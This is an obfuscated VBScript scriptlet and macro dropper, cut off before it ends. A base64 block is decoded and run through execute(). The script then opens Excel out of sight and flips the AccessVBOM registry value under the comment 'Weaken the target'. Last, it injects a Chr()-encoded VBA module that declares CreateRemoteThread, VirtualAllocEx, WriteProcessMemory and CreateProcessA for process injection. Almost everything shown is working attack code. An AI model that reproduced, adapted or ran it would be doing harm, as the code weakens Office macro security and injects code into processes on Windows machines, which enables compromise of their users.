HIoMzIpJkNocig4NCkmQ2hyKDExMSkmQ2hyKDMyKSZDaHIoODUpJiBfDQpDaHIoNjYpJkNocigxMTEpJkNocigxMTcpJkNocigxMTApJkNocigxMDApJkNocig0MCkmQ2hyKDEwOSkmQ2hyKDEyMSkmQ2hyKDY1KSZDaHIoMTE0KSZDaHIoMTE0KSZDaHIoOTcpJkNocigxMjEpJkNocig0MSkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwOSkmQ2hyKDEyMSkmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoMzIpJkNocig2MSkmQ2hyKDMyKSYgXw0KQ2hyKDEwOSkmQ2hyKDEyMSkmQ2hyKDY1KSZDaHIoMTE0KSZDaHIoMTE0KSZDaHIoOTcpJkNocigxMjEpJkNocig0MCkmQ2hyKDExMSkmQ2hyKDEwMikmQ2hyKDEwMikmQ2hyKDExNSkmQ2hyKDEwMSkmQ2hyKDExNikmQ2hyKDQxKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoMTE1KSZDaHIoMzIpJkNocig2MSkmQ2hyKDMyKSZDaHIoODcpJkNocigxMTQpJiBfDQpDaHIoMTA1KSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoODMpJkNocigxMTYpJkNocigxMTcpJkNocigxMDIpJkNocigxMDIpJkNocig0MCkmQ2hyKDExMikmQ2hyKDczKSZDaHIoMTEwKSZDaHIoMTAyKSZDaHIoMTExKSZDaHIoNDYpJkNocigxMDQpJkNocig4MCkmQ2hyKDExNCkmQ2hyKDExMSkmQ2hyKDk5KSZDaHIoMTAxKSZDaHIoMTE1KSZDaHIoMTE1KSZDaHIoNDQpJkNocigzMikmQ2hyKDExNCkmQ2hyKDExOSkmQ2hyKDEyMCkmQ2hyKDExMikmQ2hyKDk3KSZDaHIoMTAzKSZDaHIoMTAxKSYgXw0KQ2hyKDMyKSZDaHIoNDMpJkNocigzMikmQ2hyKDExMSkmQ2hyKDEwMikmQ2hyKDEwMikmQ2hyKDExNSkmQ2hyKDEwMSkmQ2hyKDExNikmQ2hyKDQ0KSZDaHIoMzIpJkNocigxMDkpJkNocigxMjEpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDQ0KSZDaHIoMzIpJkNocig0OSkmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDQ4KSZDaHIoMzgpJkNocig0MSkmQ2hyKDEwKSYgXw0KQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoNzgpJkNocigxMDEpJkNocigxMjApJkNocigxMTYpJkNocigzMikmQ2hyKDExMSkmQ2hyKDEwMikmQ2hyKDEwMikmQ2hyKDExNSkmQ2hyKDEwMSkmQ2hyKDExNikmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigxMTQpJkNocigxMDEpJkNocigxMTUpJkNocigzMikmQ2hyKDYxKSZDaHIoMzIpJkNocig2NykmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTAxKSYgXw0KQ2hyKDgzKSZDaHIoMTE2KSZDaHIoMTE3KSZDaHIoMTAyKSZDaHIoMTAyKSZDaHIoNDApJkNocigxMTIpJkNocig3MykmQ2hyKDExMCkmQ2hyKDEwMikmQ2hyKDExMSkmQ2hyKDQ2KSZDaHIoMTA0KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDQ0KSZDaHIoMzIpJkNocig0OCkmQ2hyKDQ0KSZDaHIoMzIpJkNocig0OCkmQ2hyKDQ0KSZDaHIoMzIpJkNocigxMTQpJkNocigxMTkpJkNocigxMjApJkNocigxMTIpJiBfDQpDaHIoOTcpJkNocigxMDMpJkNocigxMDEpJkNocig0NCkmQ2hyKDMyKSZDaHIoNDgpJkNocig0NCkmQ2hyKDMyKSZDaHIoNDgpJkNocig0NCkmQ2hyKDMyKSZDaHIoNDgpJkNocig0MSkmQ2hyKDEwKSZDaHIoNjkpJkNocigxMTApJkNocigxMDApJkNocigzMikmQ2hyKDgzKSZDaHIoMTE3KSZDaHIoOTgpJkNocigxMCkmQ2hyKDgzKSZDaHIoMTE3KSZDaHIoOTgpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE3KSZDaHIoMTE2KSZDaHIoMTExKSZDaHIoNzkpJkNocigxMTIpJiBfDQpDaHIoMTAxKSZDaHIoMTEwKSZDaHIoNDApJkNocig0MSkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNykmQ2hyKDExNikmQ2hyKDExMSkmQ2hyKDk1KSZDaHIoNzkpJkNocigxMTIpJkNocigxMDEpJkNocigxMTApJkNocigxMCkmQ2hyKDY5KSZDaHIoMTEwKSZDaHIoMTAwKSZDaHIoMzIpJkNocig4MykmQ2hyKDExNykmQ2hyKDk4KSZDaHIoMTApJkNocig4MykmQ2hyKDExNykmQ2hyKDk4KSZDaHIoMzIpJkNocig4NykmIF8NCkNocigxMTEpJkNocigxMTQpJkNocigxMDcpJkNocig5OCkmQ2hyKDExMSkmQ2hyKDExMSkmQ2hyKDEwNykmQ2hyKDk1KSZDaHIoNzkpJkNocigxMTIpJkNocigxMDEpJkNocigxMTApJkNocig0MCkmQ2hyKDQxKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE3KSZDaHIoMTE2KSZDaHIoMTExKSZDaHIoOTUpJkNocig3OSkmQ2hyKDExMikmQ2hyKDEwMSkmQ2hyKDExMCkmQ2hyKDEwKSZDaHIoNjkpJkNocigxMTApJkNocigxMDApJiBfDQpDaHIoMzIpJkNocig4MykmQ2hyKDExNykmQ2hyKDk4KSZDaHIoMTApDQpvYmpFeGNlbC5EaXNwbGF5QWxlcnRzID0gRmFsc2UNCm9uIGVycm9yIHJlc3VtZSBuZXh0DQpvYmpFeGNlbC5SdW4gIkF1dG9fT3BlbiINCm9ialdvcmtib29rLkNsb3NlIEZhbHNlDQpvYmpFeGNlbC5RdWl0DQoNCicgUmVzdG9yZSB0aGUgcmVnaXN0cnkgdG8gaXRzIG9sZCBzdGF0ZQ0KaWYgYWN0aW9uID0gIiIgdGhlbg0KCVdzaFNoZWxsLlJlZ0RlbGV0ZSBSZWdQYXRoDQplbHNlDQoJV3NoU2hlbGwuUmVnV3JpdGUgUmVnUGF0aCwgYWN0aW9uLCAiUkVHX0RXT1JEIg0KZW5kIGlm"

Function Decode(strB64)
 strXML = "<B64DECODE xmlns:dt=" & Chr(34) & _
        "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
        "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
        strB64 & "</B64DECODE>"
 Set oXMLDoc = CreateObject("MSXML2.DOMDocument.3.0")
 oXMLDoc.LoadXML(strXML)
 decode = oXMLDoc.selectsinglenode("B64DECODE").nodeTypedValue
 set oXMLDoc = nothing
End Function

'Stream_BinaryToString Function
'2003 Antonin Foller, http://www.motobit.com
'Binary - VT_UI1 | VT_ARRAY data To convert To a string 
Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write Binary

  'Change stream type To text/string
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText

  'Specify charset For the output text (unicode) data.
  BinaryStream.CharSet = "us-ascii"

  'Open the stream And get text/string data from the object
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

strDecoded = Stream_BinaryToString(Decode(strString))

execute(strDecoded)



</SCRIPT> 
</SCRIPTLET> 

##-----------------------
On Error Resume Next 
Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False

Set WshShell = CreateObject("Wscript.Shell")

function RegExists(regKey)
	on error resume next
	WshShell.RegRead regKey
	RegExists = (Err.number = 0)
end function

' Get the old AccessVBOM value
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"

if RegExists(RegPath) then
	action = WshShell.RegRead(RegPath)
else
	action = ""
end if

' Weaken the target
WshShell.RegWrite RegPath, 1, "REG_DWORD"

' Run the macro
Set objWorkbook = objExcel.Workbooks.Add()
Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
xlmodule.CodeModule.AddFromString Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(80)&Chr(82)&Chr(79)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(95)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(82)&Chr(77)&Chr(65)&Chr(84)&Chr(73)&Chr(79)&Chr(78)&Chr(10)& _
Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)& _
Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(100)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(100)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(84)&Chr(121)&Chr(112)&Chr(101)& _
Chr(10)&Chr(10)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(83)&Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(85)&Chr(80)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(99)& _
Chr(98)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(108)&Chr(112)&Chr(82)&Chr(101)&Chr(115)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(100)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)& _
Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(108)&Chr(112)&Chr(68)&Chr(101)&Chr(115)&Chr(107)&Chr(116)&Chr(111)&Chr(112)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(108)& _
Chr(112)&Chr(84)&Chr(105)&Chr(116)&Chr(108)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(88)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(89)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(88)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)& _
Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(89)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(88)& _
Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(89)&Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(67)& _
Chr(104)&Chr(97)&Chr(114)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(70)&Chr(105)&Chr(108)&Chr(108)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)& _
Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(70)&Chr(108)&Chr(97)&Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)& _
Chr(32)&Chr(119)&Chr(83)&Chr(104)&Chr(111)&Chr(119)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(73)&Chr(110)&Chr(116)&Chr(101)&Chr(103)&Chr(101)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(99)&Chr(98)&Chr(82)&Chr(101)& _
Chr(115)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(100)&Chr(50)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(73)&Chr(110)&Chr(116)&Chr(101)&Chr(103)&Chr(101)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(108)&Chr(112)&Chr(82)&Chr(101)&Chr(115)&Chr(101)&Chr(114)&Chr(118)&Chr(101)& _
Chr(100)&Chr(50)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(83)&Chr(116)&Chr(100)&Chr(73)&Chr(110)&Chr(112)&Chr(117)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(83)&Chr(116)&Chr(100)&Chr(79)&Chr(117)&Chr(116)&Chr(112)&Chr(117)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(83)&Chr(116)&Chr(100)& _
Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(10)&Chr(10)&Chr(35)&Chr(73)&Chr(102)&Chr(32)&Chr(86)&Chr(66)&Chr(65)&Chr(55)& _
Chr(32)&Chr(84)&Chr(104)&Chr(101)&Chr(110)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(80)&Chr(116)&Chr(114)&Chr(83)&Chr(97)&Chr(102)& _
Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)& _
Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(82)&Chr(101)&Chr(109)&Chr(111)&Chr(116)&Chr(101)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(34)& _
Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)& _
Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(83)&Chr(116)&Chr(97)&Chr(99)&Chr(107)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(83)& _
Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(97)&Chr(114)&Chr(97)&Chr(109)&Chr(101)& _
Chr(116)&Chr(101)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(108)&Chr(97)& _
Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(68)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)& _
Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(80)& _
Chr(116)&Chr(114)&Chr(83)&Chr(97)&Chr(102)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)& _
Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(86)&Chr(105)&Chr(114)&Chr(116)&Chr(117)&Chr(97)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(69)&Chr(120)&Chr(34)& _
Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)& _
Chr(108)&Chr(112)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)& _
Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)& _
Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(108)&Chr(80)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(99)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)&Chr(65)&Chr(115)& _
Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(80)&Chr(116)&Chr(114)& _
Chr(83)&Chr(97)&Chr(102)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)& _
Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(77)&Chr(101)&Chr(109)&Chr(111)&Chr(114)& _
Chr(121)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(108)&Chr(68)&Chr(101)&Chr(115)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(82)&Chr(101)&Chr(102)&Chr(32)&Chr(83)&Chr(111)&Chr(117)&Chr(114)&Chr(99)&Chr(101)& _
Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)& _
Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(87)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)& _
Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(80)&Chr(116)&Chr(114)&Chr(83)& _
Chr(97)&Chr(102)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)& _
Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(65)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)& _
Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(65)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)& _
